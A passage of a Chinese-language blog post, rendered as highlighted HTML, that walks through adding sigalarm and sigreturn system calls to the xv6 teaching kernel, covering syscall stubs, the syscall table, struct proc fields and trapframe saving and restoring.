class="hljs-keyword">int</span> <span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">exit</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span> __<span class="hljs-title">attribute__</span><span class="hljs-params">((noreturn))</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wait</span><span class="hljs-params">(<span class="hljs-keyword">int</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">read</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">close</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kill</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">exec</span><span class="hljs-params">(<span class="hljs-keyword">char</span>*, <span class="hljs-keyword">char</span>**)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">mknod</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">short</span>, <span class="hljs-keyword">short</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">unlink</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fstat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct stat*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">link</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">mkdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">chdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dup</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getpid</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">sbrk</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">uptime</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><span class="hljs-comment">// ulib.c</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">stat</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, struct stat*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">strcpy</span><span class="hljs-params">(<span class="hljs-keyword">char</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">memmove</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">strchr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">char</span> c)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">strcmp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">gets</span><span class="hljs-params">(<span class="hljs-keyword">char</span>*, <span class="hljs-keyword">int</span> max)</span></span>;<br><span class="hljs-function">uint <span class="hljs-title">strlen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">memset</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>, uint)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">malloc</span><span class="hljs-params">(uint)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">atoi</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">memcmp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, uint)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">memcpy</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, uint)</span></span>;<br></code></pre></td></tr></table></figure><p>更新 user/usys.pl (生成 user/usys.S)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/perl -w<br><br># Generate usys.S, the stubs <span class="hljs-keyword">for</span> syscalls.<br><br>print <span class="hljs-string">&quot;# generated by usys.pl - do not edit\n&quot;</span>;<br><br>print <span class="hljs-string">&quot;#include \&quot;kernel/syscall.h\&quot;\n&quot;</span>;<br><br>sub entry &#123;<br>    my $name = shift;<br>    print <span class="hljs-string">&quot;.global $name\n&quot;</span>;<br>    print <span class="hljs-string">&quot;$&#123;name&#125;:\n&quot;</span>;<br>    print <span class="hljs-string">&quot; li a7, SYS_$&#123;name&#125;\n&quot;</span>;<br>    print <span class="hljs-string">&quot; ecall\n&quot;</span>;<br>    print <span class="hljs-string">&quot; ret\n&quot;</span>;<br>&#125;<br><br>entry(<span class="hljs-string">&quot;fork&quot;</span>);<br>entry(<span class="hljs-string">&quot;exit&quot;</span>);<br>entry(<span class="hljs-string">&quot;wait&quot;</span>);<br>entry(<span class="hljs-string">&quot;pipe&quot;</span>);<br>entry(<span class="hljs-string">&quot;read&quot;</span>);<br>entry(<span class="hljs-string">&quot;write&quot;</span>);<br>entry(<span class="hljs-string">&quot;close&quot;</span>);<br>entry(<span class="hljs-string">&quot;kill&quot;</span>);<br>entry(<span class="hljs-string">&quot;exec&quot;</span>);<br>entry(<span class="hljs-string">&quot;open&quot;</span>);<br>entry(<span class="hljs-string">&quot;mknod&quot;</span>);<br>entry(<span class="hljs-string">&quot;unlink&quot;</span>);<br>entry(<span class="hljs-string">&quot;fstat&quot;</span>);<br>entry(<span class="hljs-string">&quot;link&quot;</span>);<br>entry(<span class="hljs-string">&quot;mkdir&quot;</span>);<br>entry(<span class="hljs-string">&quot;chdir&quot;</span>);<br>entry(<span class="hljs-string">&quot;dup&quot;</span>);<br>entry(<span class="hljs-string">&quot;getpid&quot;</span>);<br>entry(<span class="hljs-string">&quot;sbrk&quot;</span>);<br>entry(<span class="hljs-string">&quot;sleep&quot;</span>);<br>entry(<span class="hljs-string">&quot;uptime&quot;</span>);<br>entry(<span class="hljs-string">&quot;sigalarm&quot;</span>);<span class="hljs-comment">//</span><br>entry(<span class="hljs-string">&quot;sigreturn&quot;</span>);<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p> kernel/syscall.h </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// System call numbers</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_fork    1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_exit    2</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_wait    3</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_pipe    4</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_read    5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_kill    6</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_exec    7</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_fstat   8</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_chdir   9</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_dup    10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_getpid 11</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sbrk   12</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sleep  13</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_uptime 14</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_open   15</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_write  16</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_mknod  17</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_unlink 18</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_link   19</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_mkdir  20</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_close  21</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sigalarm 22</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sigreturn 23</span><br></code></pre></td></tr></table></figure><p>kernel/syscall.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_chdir</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_close</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_dup</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_exec</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_exit</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_fstat</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_getpid</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_kill</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_link</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_mkdir</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_mknod</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_open</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_pipe</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_read</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sbrk</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sleep</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_unlink</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_wait</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_write</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_uptime</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<span class="hljs-comment">//</span><br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<span class="hljs-comment">//</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">uint64</span> <span class="hljs-params">(*syscalls[])</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>= &#123;<br>[SYS_fork]    sys_fork,<br>[SYS_exit]    sys_exit,<br>[SYS_wait]    sys_wait,<br>[SYS_pipe]    sys_pipe,<br>[SYS_read]    sys_read,<br>[SYS_kill]    sys_kill,<br>[SYS_exec]    sys_exec,<br>[SYS_fstat]   sys_fstat,<br>[SYS_chdir]   sys_chdir,<br>[SYS_dup]     sys_dup,<br>[SYS_getpid]  sys_getpid,<br>[SYS_sbrk]    sys_sbrk,<br>[SYS_sleep]   sys_sleep,<br>[SYS_uptime]  sys_uptime,<br>[SYS_open]    sys_open,<br>[SYS_write]   sys_write,<br>[SYS_mknod]   sys_mknod,<br>[SYS_unlink]  sys_unlink,<br>[SYS_link]    sys_link,<br>[SYS_mkdir]   sys_mkdir,<br>[SYS_close]   sys_close,<br>[SYS_sigalarm] sys_sigalarm,<span class="hljs-comment">//</span><br>[SYS_sigreturn] sys_sigreturn,<span class="hljs-comment">//</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>在sysproc.c中加入sys_sigalarm和sys_sigreturn函数处理代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64 </span><br><span class="hljs-function"><span class="hljs-title">sys_sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> n;<br>  uint64 fn;<br>  <span class="hljs-keyword">if</span>(argint(<span class="hljs-number">0</span>, &amp;n) &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span>(argaddr(<span class="hljs-number">1</span>, &amp;fn) &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> sigalarm(n, (<span class="hljs-keyword">void</span>(*)())(fn));<br>&#125;<br><br><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> sigreturn();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>关于test1的提示：</p><ul><li>解决方案将要求您保存和恢复寄存器– 您需要保存和恢复哪些寄存器才能正确地恢复被中断的代码？(提示: 会有很多)。</li><li>当计时器关闭时，用户陷阱在 struct proc 中保存足够的状态，这样签名返回就可以正确地返回到被中断的用户代码。</li><li>防止对处理程序的重入调用——如果处理程序还没有返回，内核就不应该再次调用它。</li></ul><p>硬件时钟每次都强制执行一个中断，这个中断在 kernel/trap.c 中的 usertrap ()中处理。每次时钟发生硬件中断，都统计一次，到了次数就执行handler</p><p>在proc中加入如下变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-process state</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <br>  <span class="hljs-keyword">int</span> alarm_interval; <span class="hljs-comment">//n in sigalarm(n, (void(*)())(fn));</span><br>  <span class="hljs-keyword">void</span>(*alarm_handler)();<span class="hljs-comment">// fn in sigalarm(n, (void(*)())(fn));</span><br>  <span class="hljs-keyword">int</span> alarm_ticks;<span class="hljs-comment">//after alarm_ticks will </span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">saved_trapframe</span>;</span><br>  <span class="hljs-keyword">int</span> alarm_flag;<br>&#125;;<br></code></pre></td></tr></table></figure><p>完善sigalarm和sigreturn函数，并在defs.h中加入声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// defs.h</span><br><span class="hljs-function"><span class="hljs-keyword">int</span>             <span class="hljs-title">sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">void</span> (*)())</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span>             <span class="hljs-title">sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><span class="hljs-comment">//trap.c</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ticks, <span class="hljs-keyword">void</span> (*handler)())</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br>  p-&gt;alarm_interval=ticks;<br>  p-&gt;alarm_handler=handler;<br>  p-&gt;alarm_ticks=ticks;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br>  *p-&gt;trapframe = *p-&gt;saved_trapframe;<br>  p-&gt;alarm_flag = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>allocproc函数和freeproc函数也需要更新</p><ul><li>进程创建和销毁时结构体的字段的设置</li></ul><p>对进程的字段进行初始化和销毁以及页的申请</p><ul><li>使用kalloc给p-&gt;saved_trapframe分配空间</li><li>使用kfree((void *)p-&gt;saved_trapframe);销毁空间</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Look in the process table for an UNUSED proc.</span><br><span class="hljs-comment">// If found, initialize state required to run in the kernel,</span><br><span class="hljs-comment">// and return with p-&gt;lock 